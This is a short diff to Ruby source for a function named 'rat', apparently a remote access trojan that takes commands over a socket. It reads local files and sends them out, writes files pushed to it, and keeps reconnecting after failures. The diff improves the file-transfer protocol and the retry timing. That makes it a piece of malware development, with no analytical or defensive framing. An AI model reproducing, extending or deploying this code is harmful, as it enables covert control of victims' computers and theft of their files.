@@ -60,7 +60,7 @@ def rat(ip)
           socket.puts 'done'
         end
       when 'get'
-        if File.exist? file
+        if File.exist? file && format
           if format == 'binary'
             content = File.binread file
           elsif format == 'text'
@@ -83,14 +83,9 @@ def rat(ip)
         else
           socket.puts 'done'
         end
-
-        loop do
-          content = socket.gets.chomp
-          if content == 'done'
-            break
-          end
-          file.puts content
-        end
+        length = socket.gets.to_i
+        content = socket.read length
+        file.write content
         file.close
       when 'latency'
         socket.puts 'done'
@@ -111,7 +106,7 @@ def rat(ip)
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
   rescue
-    sleep 1
+    sleep 2
     retry
   end
 
